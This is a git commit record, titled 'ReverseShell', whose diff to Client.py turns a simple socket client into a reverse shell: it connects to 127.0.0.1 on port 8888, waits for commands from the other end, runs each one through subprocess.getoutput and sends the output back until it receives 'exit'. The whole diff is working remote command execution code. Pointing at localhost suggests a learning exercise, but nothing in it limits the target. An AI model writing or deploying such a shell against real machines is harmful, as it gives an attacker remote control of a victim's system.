f79f83dd0d6c7e17c420bf756253e535e8ffbe2f
KyalovYuriy <hikker1998@gmail.com>
2022-07-07 12:50:52 +0500

    ReverseShell

--- Client.py
+++ Client.py
@@ -1,5 +1,11 @@
 import socket
+import subprocess
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(('127.0.0.1',8888))
-s.send(b'My message')
+while True:
+    command = s.recv(1024).decode()
+    if command.lower() == 'exit':
+        break
+    output = subprocess.getoutput(command)
+    s.send(output.encode())
 s.close()
